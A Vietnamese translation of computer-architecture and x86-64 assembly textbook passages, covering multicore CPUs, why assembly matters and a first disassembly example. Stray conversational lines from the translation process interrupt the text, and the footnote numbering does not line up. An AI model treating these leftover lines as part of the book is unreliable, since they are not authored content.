<p>Multithreading có thể được triển khai bằng phần cứng trên cả vi xử lý kiểu scalar và superscalar. Tối thiểu, phần cứng cần hỗ trợ việc nạp lệnh từ nhiều dòng lệnh riêng biệt (mỗi dòng tương ứng với một luồng thực thi), và có tập thanh ghi riêng cho mỗi dòng lệnh. Các kiến trúc này được gọi là <strong>explicitly multithreaded</strong><sup class="footnote-reference"><a href="#4">3</a></sup> vì, khác với kiến trúc superscalar, mỗi dòng thực thi được hệ điều hành lập lịch độc lập để chạy một chuỗi lệnh chương trình riêng biệt. Các dòng thực thi này có thể đến từ nhiều chương trình tuần tự khác nhau hoặc từ nhiều luồng phần mềm của một chương trình song song đa luồng đơn (ta sẽ thảo luận về lập trình song song đa luồng trong <a href="C5-Arch/../C14-SharedMemory/multicore.html#_programming_multicore_systems">Chương 14</a>).</p>
<p>Các vi kiến trúc đa luồng phần cứng dựa trên bộ xử lý superscalar có nhiều pipeline và nhiều đơn vị thực thi, do đó chúng có thể thực thi các lệnh từ nhiều luồng phần cứng đồng thời, song song, đạt IPC lớn hơn 1. Các kiến trúc đa luồng dựa trên bộ xử lý scalar đơn giản thường triển khai <strong>interleaved multithreading</strong> (&quot;đa luồng xen kẽ&quot;). Các vi kiến trúc này thường dùng chung một pipeline và luôn dùng chung ALU của bộ xử lý (CPU sẽ luân phiên thực thi các luồng trên cùng một ALU). Loại đa luồng này không thể đạt IPC lớn hơn 1. Đa luồng phần cứng được hỗ trợ bởi vi kiến trúc dựa trên superscalar thường được gọi là <strong>simultaneous multithreading</strong> (SMT – &quot;đa luồng đồng thời&quot;)<sup class="footnote-reference"><a href="#4">3</a></sup>. Đáng tiếc là thuật ngữ SMT thường được dùng để chỉ cả hai loại đa luồng phần cứng, và bản thân thuật ngữ này không đủ để xác định liệu một vi kiến trúc đa luồng có thực sự triển khai đa luồng đồng thời hay chỉ là đa luồng xen kẽ.</p>
<p><strong>Multicore processors</strong> (bộ xử lý đa nhân) chứa nhiều nhân CPU hoàn chỉnh. Giống như bộ xử lý đa luồng, mỗi nhân được hệ điều hành lập lịch độc lập. Tuy nhiên, mỗi nhân trong bộ xử lý đa nhân là một nhân CPU đầy đủ, có chức năng riêng biệt để thực thi lệnh chương trình. Một bộ xử lý đa nhân chứa các bản sao của các nhân CPU này, cùng với một số phần cứng bổ sung để các nhân chia sẻ dữ liệu cache. Mỗi nhân trong bộ xử lý đa nhân có thể là scalar, superscalar hoặc đa luồng phần cứng. <a href="C5-Arch/modern.html#Figmulticoreprocesor">Hình 1</a> minh họa một ví dụ về máy tính đa nhân.</p>
<p><img src="C5-Arch/_images/multicore.png" alt="a multicore computer showing the processor chip with multiple CPU cores" /></p>
<p><strong>Hình 1. Một máy tính với bộ xử lý đa nhân.</strong><br />
Bộ xử lý chứa nhiều nhân CPU hoàn chỉnh, mỗi nhân có bộ nhớ cache riêng. Các nhân giao tiếp với nhau và chia sẻ bộ nhớ cache lớn hơn thông qua các bus trên chip.</p>
<p>Thiết kế vi xử lý đa nhân là cách chính để hiệu năng kiến trúc bộ xử lý tiếp tục theo kịp Định luật Moore mà không cần tăng tần số xung nhịp. Một máy tính đa nhân có thể chạy đồng thời nhiều chương trình tuần tự, hệ điều hành sẽ lập lịch mỗi nhân với một dòng lệnh của chương trình khác nhau. Nó cũng có thể tăng tốc độ thực thi của một chương trình đơn nếu chương trình đó được viết dưới dạng chương trình song song đa luồng tường minh (luồng phần mềm). Ví dụ, hệ điều hành có thể lập lịch các luồng của một chương trình để chạy đồng thời trên các nhân riêng biệt của bộ xử lý đa nhân, giúp chương trình thực thi nhanh hơn so với phiên bản tuần tự của chính nó. Trong <a href="C5-Arch/../C14-SharedMemory/index.html#_leveraging_shared_memory_in_the_multicore_era">Chương 14</a>, ta sẽ thảo luận về lập trình song song đa luồng tường minh cho hệ thống đa nhân và các hệ thống song song khác có bộ nhớ chính chia sẻ.</p>
<h3 id="593-một-số-bộ-xử-lý-tiêu-biểu"><a class="header" href="#593-một-số-bộ-xử-lý-tiêu-biểu">5.9.3. Một số bộ xử lý tiêu biểu</a></h3>
<p>Ngày nay, các bộ xử lý được xây dựng bằng cách kết hợp các công nghệ ILP, đa luồng phần cứng và đa nhân. Thực tế, rất khó để tìm thấy một bộ xử lý không phải đa nhân. Các bộ xử lý dành cho máy tính để bàn thường có từ hai đến tám nhân, nhiều trong số đó cũng hỗ trợ mức đa luồng thấp trên mỗi nhân. Ví dụ, các bộ xử lý đa nhân AMD Zen<sup class="footnote-reference"><a href="#5">4</a></sup> và các bộ xử lý đa nhân Intel Xeon và Core có hỗ trợ hyperthreading<sup class="footnote-reference"><a href="#6">5</a></sup> đều hỗ trợ hai luồng phần cứng trên mỗi nhân. Các nhân hyperthreaded của Intel triển khai đa luồng xen kẽ. Do đó, mỗi nhân chỉ đạt IPC bằng 1, nhưng với nhiều nhân CPU trên mỗi chip, bộ xử lý vẫn có thể đạt IPC tổng thể cao hơn.</p>
<p>Các bộ xử lý được thiết kế cho hệ thống cao cấp, như máy chủ và siêu máy tính, có nhiều nhân, mỗi nhân có mức độ đa luồng cao. Ví dụ, bộ xử lý Oracle SPARC M7<sup class="footnote-reference"><a href="#7">6</a></sup> dùng trong máy chủ cao cấp có 32 nhân. Mỗi nhân có tám luồng phần cứng, trong đó hai luồng có thể thực thi đồng thời, đạt IPC tối đa là 64 cho toàn bộ bộ xử lý. Hai siêu máy tính nhanh nhất thế giới (tính đến tháng 6 năm 2019)<sup class="footnote-reference"><a href="#8">7</a></sup> sử dụng bộ xử lý IBM Power 9<sup class="footnote-reference"><a href="#9">8</a></sup>. Bộ xử lý Power 9 có tối đa 24 nhân trên mỗi chip, và mỗi nhân hỗ trợ đa luồng đồng thời lên đến tám luồng. Phiên bản 24 nhân của Power 9 có thể đạt IPC tối đa là 192.</p>
<h3 id="ghi-chú"><a class="header" href="#ghi-chú">Ghi chú</a></h3>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">9</sup>
<p>Moore first observed a doubling every year in 1965, that he then
updated in 1975 to every &gt; 2 years, which became known as Moore's
Law.</p>
</div>
<ol start="2">
<li>
<p>Moore's Law held until around 2012 when improvements in transistor
density began to slow. Moore predicted the end of Moore's Law in the
mid 2020s.</p>
</li>
<li>
<p>&quot;The End of Dennard scaling&quot; by Adrian McMenamin, 2013.
<a href="https://cartesianproduct.wordpress.com/2013/04/15/the-end-of-dennard-scaling/">https://cartesianproduct.wordpress.com/2013/04/15/the-end-of-dennard-scaling/</a>{.bare}</p>
</li>
<li>
<p>&quot;A Survey of Processors with Explicit Multithreading&quot;, by Ungerer,
Robic, and Silc. In ACM Computing Surveys, Vol. 35, No. 1, March
2003, pp. 29--63.
<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.96.9105&amp;rep=rep1&amp;type=pdf">http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.96.9105&amp;rep=rep1&amp;type=pdf</a>{.bare}</p>
</li>
<li>
<p>AMD's Zen Architectures:
<a href="https://www.amd.com/en/technologies/zen-core">https://www.amd.com/en/technologies/zen-core</a>{.bare}</p>
</li>
<li>
<p>Intel's Xeon and Core processors with Hyper-Threading:
<a href="https://www.intel.com/content/www/us/en/architecture-and-technology/hyper-threading/hyper-threading-technology.html">https://www.intel.com/content/www/us/en/architecture-and-technology/hyper-threading/hyper-threading-technology.html</a>{.bare}</p>
</li>
<li>
<p>Oracle's SPARC M7 Processor:
<a href="http://www.oracle.com/us/products/servers-storage/sparc-m7-processor-ds-2687041.pdf">http://www.oracle.com/us/products/servers-storage/sparc-m7-processor-ds-2687041.pdf</a>{.bare}</p>
</li>
<li>
<p>Top 500 Lists:
<a href="https://www.top500.org/lists/top500/">https://www.top500.org/lists/top500/</a>{.bare}</p>
</li>
<li>
<p>IBM's Power 9 Processor:
<a href="https://www.ibm.com/it-infrastructure/power/power9">https://www.ibm.com/it-infrastructure/power/power9</a>{.bare}</p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="510-tóm-tắt"><a class="header" href="#510-tóm-tắt">5.10. Tóm tắt</a></h2>
<p>Trong chương này, chúng ta đã trình bày kiến trúc của máy tính, tập trung vào thiết kế và triển khai bộ xử lý (CPU) nhằm hiểu cách nó thực thi một chương trình. Các bộ xử lý hiện đại ngày nay đều dựa trên kiến trúc von Neumann, vốn định nghĩa một máy tính đa dụng với chương trình được lưu trữ trong bộ nhớ. Thiết kế đa dụng của kiến trúc von Neumann cho phép nó thực thi bất kỳ loại chương trình nào.</p>
<p>Để hiểu cách CPU thực thi các lệnh chương trình, ta đã xây dựng một CPU ví dụ, bắt đầu từ các khối xây dựng cơ bản là cổng logic để tạo thành các mạch số, từ đó triển khai một bộ xử lý số. Chức năng của bộ xử lý số được hình thành bằng cách kết hợp các mạch điều khiển, mạch lưu trữ và mạch số học/logic, và được điều khiển bởi mạch xung nhịp, vốn dẫn dắt các pha Fetch, Decode, Execute và WriteBack trong quá trình thực thi lệnh chương trình.</p>
<p>Mọi kiến trúc bộ xử lý đều triển khai một <strong>instruction set architecture</strong> (ISA – &quot;kiến trúc tập lệnh&quot;), định nghĩa tập hợp các lệnh CPU, tập hợp các thanh ghi CPU, và ảnh hưởng của việc thực thi lệnh lên trạng thái của bộ xử lý. Có rất nhiều ISA khác nhau, và thường có nhiều phiên bản vi xử lý khác nhau cùng triển khai một ISA nhất định. Các vi xử lý hiện đại ngày nay cũng sử dụng nhiều kỹ thuật để cải thiện hiệu năng, bao gồm thực thi kiểu pipeline, song song ở cấp độ lệnh (instruction-level parallelism), và thiết kế đa nhân (multicore).</p>
<p>Để tìm hiểu sâu và rộng hơn về kiến trúc máy tính, chúng tôi khuyến nghị bạn đọc thêm các giáo trình chuyên sâu về kiến trúc máy tính<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<h3 id="ghi-chú-1"><a class="header" href="#ghi-chú-1">Ghi chú</a></h3>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>Một gợi ý là cuốn <em>Computer Organization and Design: The Hardware and Software Interface</em> của David A. Patterson và John L. Hennessy.</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h2 id="6-dưới-lớp-c-lặn-sâu-vào-assembly"><a class="header" href="#6-dưới-lớp-c-lặn-sâu-vào-assembly">6. Dưới lớp C: Lặn sâu vào Assembly</a></h2>
<p><em>Under the C, under the C</em></p>
<p><em>Don't you know it's better</em></p>
<p><em>Dealing with registers</em></p>
<p><em>And assembly?</em></p>
<p>— Sebastian, có lẽ vậy</p>
<p>Trước khi <strong>compiler</strong> (trình biên dịch) ra đời trong những ngày đầu của ngành khoa học máy tính, nhiều lập trình viên viết code bằng <strong>assembly language</strong> (ngôn ngữ hợp ngữ), ngôn ngữ mô tả trực tiếp tập lệnh mà máy tính sẽ thực thi. Assembly language là cấp độ gần nhất mà lập trình viên có thể tiếp cận khi lập trình ở mức máy mà không phải viết trực tiếp bằng các chuỗi 1 và 0, và nó là dạng dễ đọc hơn của <strong>machine code</strong> (code máy). Để viết được code assembly hiệu quả, lập trình viên phải hiểu tường tận cách thức hoạt động của kiến trúc máy tính bên dưới.</p>
<p>Sự ra đời của <strong>compiler</strong> đã thay đổi căn bản cách lập trình viên viết code. Compiler dịch một ngôn ngữ lập trình có thể đọc được bởi con người (thường được viết bằng các từ tiếng Anh) sang một ngôn ngữ mà máy tính có thể hiểu (tức là machine code). Compiler thực hiện việc dịch này dựa trên các quy tắc của ngôn ngữ lập trình, đặc tả của hệ điều hành, và tập lệnh (instruction set) của máy, đồng thời cung cấp khả năng phát hiện lỗi và kiểm tra kiểu dữ liệu (type checking) trong quá trình dịch. Hầu hết các compiler hiện đại tạo ra code assembly hiệu quả tương đương với code assembly viết tay của những năm trước đây.</p>
<h3 id="lợi-ích-của-việc-học-assembly"><a class="header" href="#lợi-ích-của-việc-học-assembly">Lợi ích của việc học Assembly</a></h3>
<p>Với tất cả những lợi ích mà compiler mang lại, có thể không rõ ràng tại sao việc học assembly lại hữu ích. Tuy nhiên, có một số lý do thuyết phục để học và hiểu code assembly. Dưới đây là một vài ví dụ.</p>
<h4 id="1-mức-trừu-tượng-cao-che-giấu-các-chi-tiết-giá-trị-của-chương-trình"><a class="header" href="#1-mức-trừu-tượng-cao-che-giấu-các-chi-tiết-giá-trị-của-chương-trình">1. Mức trừu tượng cao che giấu các chi tiết giá trị của chương trình</a></h4>
<p>Sự trừu tượng mà các ngôn ngữ lập trình bậc cao cung cấp là một lợi thế lớn trong việc giảm độ phức tạp của lập trình. Tuy nhiên, sự đơn giản hóa này cũng khiến lập trình viên dễ đưa ra các quyết định thiết kế mà không hiểu đầy đủ tác động của chúng ở mức máy. Thiếu kiến thức về assembly thường khiến lập trình viên không nắm bắt được những thông tin giá trị về cách chương trình chạy, và hạn chế khả năng hiểu rõ code của mình thực sự đang làm gì.</p>
<p>Ví dụ, hãy xem chương trình sau:</p>
<pre><code>#include &lt;stdio.h&gt;

int adder() {
    int a;
    return a + 2;
}

int assign() {
    int y = 40;
    return y;
}

int main(void) {
    int x;
    assign();
    x = adder();
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Kết quả của chương trình này là gì? Nhìn qua, hàm <code>assign</code> dường như không có tác dụng, vì giá trị trả về của nó không được lưu vào bất kỳ biến nào trong <code>main</code>. Hàm <code>adder</code> trả về giá trị <code>a + 2</code>, mặc dù biến <code>a</code> chưa được khởi tạo (dù trên một số máy, compiler sẽ khởi tạo <code>a</code> bằng 0). Việc in ra <code>x</code> lẽ ra sẽ cho kết quả không xác định. Tuy nhiên, khi biên dịch và chạy trên hầu hết các máy 64-bit, kết quả lại luôn là <code>42</code>:</p>
<pre><code>$ gcc -o example example.c
$ ./example
x is: 42
</code></pre>
<p>Kết quả này thoạt nhìn có vẻ vô lý, vì <code>adder</code> và <code>assign</code> dường như không liên quan. Việc hiểu về <strong>stack frame</strong> và cách các hàm thực thi ở tầng thấp sẽ giúp bạn lý giải tại sao kết quả lại là <code>42</code>. Chúng ta sẽ quay lại ví dụ này trong các chương tiếp theo.</p>
<h4 id="2-một-số-hệ-thống-máy-tính-bị-giới-hạn-tài-nguyên-không-thể-dùng-compiler"><a class="header" href="#2-một-số-hệ-thống-máy-tính-bị-giới-hạn-tài-nguyên-không-thể-dùng-compiler">2. Một số hệ thống máy tính bị giới hạn tài nguyên, không thể dùng compiler</a></h4>
<p>Những loại “máy tính” phổ biến nhất lại thường là những thứ mà ta không dễ nhận ra là máy tính. Chúng xuất hiện ở khắp nơi, từ ô tô, máy pha cà phê, máy giặt cho đến đồng hồ thông minh. Các cảm biến, vi điều khiển (microcontroller) và các bộ xử lý nhúng (embedded processor) ngày càng đóng vai trò quan trọng trong cuộc sống, và tất cả đều cần phần mềm để hoạt động.</p>
<p>Tuy nhiên, các bộ xử lý trong những thiết bị này thường rất nhỏ, đến mức không thể chạy code đã biên dịch từ các ngôn ngữ lập trình bậc cao. Trong nhiều trường hợp, các thiết bị này yêu cầu các chương trình assembly độc lập, không phụ thuộc vào các thư viện runtime mà các ngôn ngữ lập trình phổ biến cần.</p>
<p>Nếu bạn muốn, ở phần tiếp theo mình có thể dịch luôn các mục còn lại của chương này để bạn có bản tiếng Việt hoàn chỉnh và thống nhất về thuật ngữ. Bạn có muốn mình tiếp tục không?</p>
<h4 id="3-phân-tích-lỗ-hổng-bảo-mật-vulnerability-analysis"><a class="header" href="#3-phân-tích-lỗ-hổng-bảo-mật-vulnerability-analysis">3. Phân tích lỗ hổng bảo mật (Vulnerability Analysis)</a></h4>
<p>Một nhóm nhỏ các chuyên gia bảo mật dành thời gian của họ để tìm kiếm các <strong>vulnerabilities</strong> (lỗ hổng) trong nhiều loại hệ thống máy tính khác nhau. Nhiều hướng tấn công vào một chương trình liên quan đến cách chương trình lưu trữ thông tin <strong>runtime</strong> (thời gian chạy). Việc học <strong>assembly</strong> giúp các chuyên gia bảo mật hiểu được cách các lỗ hổng xuất hiện và cách chúng có thể bị khai thác.</p>
<p>Một số chuyên gia bảo mật khác dành thời gian để <strong>reverse engineering</strong> (kỹ thuật đảo ngược) code độc trong <strong>malware</strong> (phần mềm độc hại) và các phần mềm nguy hại khác. Kiến thức thực hành về assembly là điều thiết yếu để các kỹ sư phần mềm này có thể nhanh chóng phát triển các <strong>countermeasures</strong> (biện pháp đối phó) nhằm bảo vệ hệ thống trước các cuộc tấn công. Cuối cùng, các lập trình viên không hiểu cách code họ viết được dịch sang assembly có thể vô tình viết ra code dễ bị tấn công.</p>
<h4 id="4-các-đoạn-code-quan-trọng-trong-phần-mềm-cấp-hệ-thống-critical-code-sequences-in-system-level-software"><a class="header" href="#4-các-đoạn-code-quan-trọng-trong-phần-mềm-cấp-hệ-thống-critical-code-sequences-in-system-level-software">4. Các đoạn code quan trọng trong phần mềm cấp hệ thống (Critical Code Sequences in System-Level Software)</a></h4>
<p>Cuối cùng, có một số thành phần của hệ thống máy tính mà compiler không thể tối ưu hóa đủ tốt và cần phải viết assembly thủ công. Một số phần ở cấp hệ thống có code assembly viết tay tại những khu vực mà tối ưu hóa chi tiết, phụ thuộc vào kiến trúc máy là rất quan trọng cho hiệu năng.</p>
<p>Ví dụ, <strong>boot sequence</strong> (trình tự khởi động) trên tất cả các máy tính đều được viết bằng assembly. <strong>Operating system</strong> (hệ điều hành) thường chứa code assembly viết tay cho việc <strong>thread</strong> hoặc <strong>process context-switching</strong> (chuyển ngữ cảnh luồng hoặc tiến trình). Con người thường có thể tạo ra code assembly được tối ưu hóa tốt hơn compiler cho những đoạn code ngắn nhưng quan trọng về hiệu năng này.</p>
<h3 id="bạn-sẽ-học-gì-trong-các-chương-tiếp-theo"><a class="header" href="#bạn-sẽ-học-gì-trong-các-chương-tiếp-theo">Bạn sẽ học gì trong các chương tiếp theo</a></h3>
<p>Ba chương tiếp theo sẽ đề cập đến ba “hương vị” khác nhau của assembly.<br />
<a href="C6-asm_intro/../C7-x86_64/index.html#_x64_assembly_chapter">Chương 7</a> và <a href="C6-asm_intro/../C8-IA32/index.html#_IA32_assembly_chapter">Chương 8</a> nói về <strong>x86_64</strong> và dạng trước đó của nó, <strong>IA32</strong>.<br />
<a href="C6-asm_intro/../C9-ARM64/index.html#_a64_assembly_chapter">Chương 9</a> nói về <strong>ARMv8-A assembly</strong>, đây là <strong>ISA</strong> (Instruction Set Architecture — kiến trúc tập lệnh) được sử dụng trên hầu hết các thiết bị ARM hiện đại, bao gồm cả các máy tính bo mạch đơn như <strong>Raspberry Pi</strong>.<br />
<a href="C6-asm_intro/../C10-asm_takeaways/index.html#_assembly_summary">Chương 10</a> chứa phần tóm tắt và một số điểm then chốt khi học assembly.</p>
<p>Mỗi “hương vị” assembly này triển khai một <strong>ISA</strong> khác nhau. Hãy nhớ rằng một <a href="C6-asm_intro/../C5-Arch/index.html#_what_von_neumann_knew_computer_architecture">ISA</a> định nghĩa tập lệnh và cách code hóa nhị phân của chúng, tập các <strong>CPU registers</strong> (thanh ghi CPU), và tác động của việc thực thi các lệnh lên trạng thái của CPU và bộ nhớ.</p>
<p>Trong ba chương tiếp theo, bạn sẽ thấy những điểm tương đồng chung giữa tất cả các ISA, bao gồm việc CPU registers được dùng làm toán hạng cho nhiều lệnh, và mỗi ISA cung cấp các loại lệnh tương tự nhau:</p>
<ol>
<li><strong>Instructions</strong> cho các phép toán số học và logic, như phép cộng hoặc <strong>bitwise AND</strong>.</li>
<li><strong>Instructions</strong> cho điều khiển luồng (control flow) dùng để triển khai rẽ nhánh như <code>if-else</code>, vòng lặp, và lời gọi/trả về hàm.</li>
<li><strong>Instructions</strong> cho di chuyển dữ liệu (data movement) để nạp và lưu giá trị giữa CPU registers và bộ nhớ.</li>
<li><strong>Instructions</strong> để <strong>push</strong> và <strong>pop</strong> giá trị từ <strong>stack</strong>. Các lệnh này được dùng để triển khai <strong>execution call stack</strong>, nơi một <strong>stack frame</strong> mới (lưu trữ biến cục bộ và tham số của hàm đang chạy) được thêm vào đỉnh stack khi gọi hàm, và một frame được gỡ bỏ khỏi đỉnh stack khi hàm trả về.</li>
</ol>
<p>Một <strong>C compiler</strong> dịch mã nguồn C sang tập lệnh ISA cụ thể. Compiler dịch các câu lệnh C, bao gồm vòng lặp, <code>if-else</code>, lời gọi hàm và truy cập biến, sang một tập lệnh cụ thể được định nghĩa bởi ISA và được thực thi bởi CPU được thiết kế để chạy các lệnh từ ISA đó. Ví dụ, compiler dịch C sang lệnh <strong>x86</strong> để chạy trên bộ xử lý Intel x86, hoặc dịch C sang lệnh <strong>ARM</strong> để chạy trên bộ xử lý ARM.</p>
<p>Khi đọc các chương thuộc phần assembly của cuốn sách, bạn có thể nhận thấy một số thuật ngữ quan trọng được định nghĩa lại và một số hình minh họa được lặp lại. Để hỗ trợ tốt nhất cho các giảng viên ngành Khoa học Máy tính, chúng tôi thiết kế mỗi chương có thể được sử dụng độc lập tại các trường cao đẳng và đại học. Mặc dù phần lớn nội dung trong mỗi chương là duy nhất, chúng tôi hy vọng những điểm chung giữa các chương sẽ giúp củng cố sự tương đồng giữa các “hương vị” assembly khác nhau trong tâm trí người đọc.</p>
<p>Sẵn sàng học assembly chưa? Hãy bắt đầu ngay thôi! Truy cập các liên kết dưới đây để đến những chương mà bạn quan tâm:</p>
<p>(Chưa thêm đâu nhé...)</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="7-assembly-x86-64-bit-x86-64"><a class="header" href="#7-assembly-x86-64-bit-x86-64">7. Assembly x86 64-bit (x86-64)</a></h2>
<p>Trong chương này, chúng ta sẽ tìm hiểu về <strong>Intel Architecture 64-bit</strong> (x86-64) — <strong>instruction set architecture</strong> (ISA — kiến trúc tập lệnh). Hãy nhớ rằng một <a href="C7-x86_64/../C5-Arch/index.html#_what_von_neumann_knew_computer_architecture">instruction set architecture</a> định nghĩa tập hợp các lệnh và cách code hóa nhị phân của một chương trình ở cấp độ máy.<br />
Để chạy các ví dụ trong chương này, bạn cần có quyền truy cập vào một máy tính với bộ xử lý x86 64-bit. Thuật ngữ “x86” thường được dùng đồng nghĩa với kiến trúc IA-32. Phần mở rộng 64-bit của kiến trúc này được gọi là <strong>x86-64</strong> (hoặc x64) và hiện diện phổ biến trong các máy tính hiện đại. Cả IA32 và x86-64 đều thuộc họ kiến trúc x86.</p>
<p>Để kiểm tra xem máy Linux của bạn có bộ xử lý Intel 64-bit hay không, hãy chạy lệnh <code>uname -m</code>. Nếu hệ thống của bạn là x86-64, bạn sẽ thấy kết quả như sau:</p>
<pre><code>$ uname -m
x86_64
</code></pre>
<p>Vì x86-64 là phần mở rộng của ISA IA32 nhỏ hơn, một số bạn đọc có thể muốn tìm hiểu về IA32 trước. Để đọc thêm về IA32, hãy xem <strong>Chương 8</strong>.</p>
<blockquote>
<p><strong>Các nhánh cú pháp của x86</strong></p>
</blockquote>
<p>Kiến trúc x86 thường tuân theo một trong hai nhánh cú pháp khác nhau.<br />
Các máy UNIX thường sử dụng cú pháp <strong>AT&amp;T</strong>, vì UNIX được phát triển tại AT&amp;T Bell Labs. <strong>Assembler</strong> (trình hợp dịch) tương ứng là <strong>GNU Assembler</strong> (GAS). Vì chúng ta sử dụng GCC cho hầu hết các ví dụ trong sách này, nên chương này sẽ trình bày cú pháp AT&amp;T.<br />
Các máy Windows thường sử dụng cú pháp <strong>Intel</strong>, được dùng bởi <strong>Microsoft Macro Assembler</strong> (MASM). <strong>Netwide Assembler</strong> (NASM) là một ví dụ về assembler trên Linux sử dụng cú pháp Intel.<br />
Tranh luận về việc cú pháp nào “tốt hơn” là một trong những “cuộc chiến kinh điển” trong lĩnh vực này. Tuy nhiên, việc quen thuộc với cả hai cú pháp là hữu ích, vì lập trình viên có thể gặp bất kỳ cú pháp nào trong các tình huống khác nhau.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="71-bắt-đầu-với-assembly-những-điều-cơ-bản"><a class="header" href="#71-bắt-đầu-với-assembly-những-điều-cơ-bản">7.1. Bắt đầu với Assembly: Những điều cơ bản</a></h2>
<p>Để có cái nhìn đầu tiên về <strong>x64 assembly</strong>, chúng ta sẽ chỉnh sửa hàm <code>adder</code> từ <a href="C7-x86_64/index.html#_assembly_chapter">Chương 6</a> để đơn giản hóa hành vi của nó. Phiên bản đã chỉnh sửa (<code>adder2</code>) được hiển thị bên dưới:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

// adds two to an integer and returns the result
int adder2(int a) {
    return a + 2;
}

int main(void){
    int x = 40;
    x = adder2(x);
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Để biên dịch đoạn code này, sử dụng lệnh sau:</p>
<pre><code>$ gcc -o adder adder.c
</code></pre>
<p>Tiếp theo, hãy xem code assembly tương ứng của chương trình này bằng cách sử dụng lệnh <code>objdump</code>:</p>
<pre><code>$ objdump -d adder &gt; output
$ less output
</code></pre>
<p>Tìm đoạn code liên quan đến hàm <code>adder2</code> bằng cách gõ <code>/adder2</code> khi đang xem tệp <code>output</code> với <code>less</code>. Phần liên quan đến <code>adder2</code> sẽ trông tương tự như sau:</p>
<p><strong>Kết quả assembly cho hàm <code>adder2</code></strong></p>
<pre><code>0000000000400526 &lt;adder2&gt;:
  400526:       55                      push   %rbp
  400527:       48 89 e5                mov    %rsp,%rbp
  40052a:       89 7d fc                mov    %edi,-0x4(%rbp)
  40052d:       8b 45 fc                mov    -0x4(%rbp),%eax
  400530:       83 c0 02                add    $0x2,%eax
  400533:       5d                      pop    %rbp
  400534:       c3                      retq
</code></pre>
<p>Đừng lo nếu bạn chưa hiểu chuyện gì đang xảy ra. Chúng ta sẽ tìm hiểu chi tiết hơn về assembly trong các phần sau. Hiện tại, hãy nghiên cứu cấu trúc của từng lệnh riêng lẻ.</p>
<p>Mỗi dòng trong ví dụ trên chứa <strong>địa chỉ 64-bit</strong> của lệnh trong bộ nhớ chương trình, <strong>các byte</strong> tương ứng với lệnh đó, và <strong>dạng văn bản</strong> (plaintext) của chính lệnh. Ví dụ, <code>55</code> là dạng <strong>machine code</strong> (code máy) của lệnh <code>push %rbp</code>, và lệnh này nằm tại địa chỉ <code>0x400526</code> trong bộ nhớ chương trình. Lưu ý rằng <code>0x400526</code> là dạng rút gọn của địa chỉ 64-bit đầy đủ của lệnh <code>push %rbp</code>; các số 0 ở đầu bị lược bỏ để dễ đọc hơn.</p>
<p>Điều quan trọng cần lưu ý là một dòng code C thường được dịch thành nhiều lệnh assembly. Chẳng hạn, phép toán <code>a + 2</code> được biểu diễn bằng hai lệnh: <code>mov -0x4(%rbp), %eax</code> và <code>add $0x2, %eax</code>.</p>
<blockquote>
<p><strong>Assembly của bạn có thể trông khác!</strong><br />
Nếu bạn đang biên dịch code của mình cùng với chúng tôi, bạn có thể nhận thấy rằng một số ví dụ assembly của bạn trông khác so với những gì được hiển thị trong sách này. Các lệnh assembly chính xác mà compiler xuất ra phụ thuộc vào phiên bản compiler và hệ điều hành bên dưới. Hầu hết các ví dụ assembly trong sách này được tạo ra trên các hệ thống chạy Ubuntu hoặc Red Hat Enterprise Linux (RHEL).</p>
<p>Trong các ví dụ tiếp theo, chúng tôi <strong>không</strong> sử dụng bất kỳ optimization flag hóa nào. Ví dụ, chúng tôi biên dịch bất kỳ tệp ví dụ nào (<code>example.c</code>) bằng lệnh:<br />
<code>gcc -o example example.c</code><br />
Do đó, sẽ có nhiều lệnh trông như dư thừa trong các ví dụ. Hãy nhớ rằng compiler không “thông minh” — nó chỉ đơn giản tuân theo một loạt quy tắc để dịch code dễ đọc của con người sang ngôn ngữ máy. Trong quá trình dịch này, việc xuất hiện một số lệnh dư thừa là điều bình thường. Các compiler tối ưu hóa sẽ loại bỏ nhiều lệnh dư thừa này trong quá trình tối ưu hóa, nội dung sẽ được đề cập trong <a href="C7-x86_64/../C12-CodeOpt/index.html#_code_optimization">một chương sau</a>.</p>
</blockquote>
<h3 id="711-thanh-ghi-registers"><a class="header" href="#711-thanh-ghi-registers">7.1.1. Thanh ghi (Registers)</a></h3>
<p>Hãy nhớ rằng <strong>register</strong> (thanh ghi) là một đơn vị lưu trữ có kích thước bằng một từ (word-sized) nằm trực tiếp trên CPU. Có thể có các thanh ghi riêng cho dữ liệu, lệnh và địa chỉ. Ví dụ, CPU Intel có tổng cộng 16 thanh ghi để lưu trữ dữ liệu 64-bit:</p>
<p><code>%rax</code>, <code>%rbx</code>, <code>%rcx</code>, <code>%rdx</code>, <code>%rdi</code>, <code>%rsi</code>, <code>%rsp</code>, <code>%rbp</code>, và <code>%r8</code>–<code>%r15</code>. Tất cả các thanh ghi này, trừ <code>%rsp</code> và <code>%rbp</code>, đều chứa dữ liệu 64-bit đa dụng (general-purpose). Mặc dù một chương trình có thể diễn giải nội dung của một thanh ghi như một số nguyên hoặc một địa chỉ, bản thân thanh ghi không phân biệt điều đó. Chương trình có thể đọc hoặc ghi vào cả 16 thanh ghi này.</p>
